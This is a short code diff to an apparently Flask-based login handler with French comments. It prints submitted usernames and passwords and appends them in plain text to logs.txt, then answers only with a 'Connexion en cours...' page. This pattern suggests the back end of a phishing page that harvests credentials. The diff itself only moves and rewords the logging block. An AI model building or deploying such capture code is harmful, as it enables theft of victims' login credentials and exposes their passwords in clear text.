@@ -11,12 +11,12 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
+    # Enregistrer les identifiants dans logs.txt
+    with open("logs.txt", "a") as f:
+        f.write(f"Username: {username} | Password: {password}\n")
+
     print(f"[+] Nom d'utilisateur reçu : {username}")
     print(f"[+] Mot de passe reçu : {password}")
-
-    # Écriture dans logs.txt
-    with open("logs.txt", "a") as f:
-        f.write(f"username: {username}, password: {password}\n")
 
     return "<h1>Connexion en cours...</h1>"
 
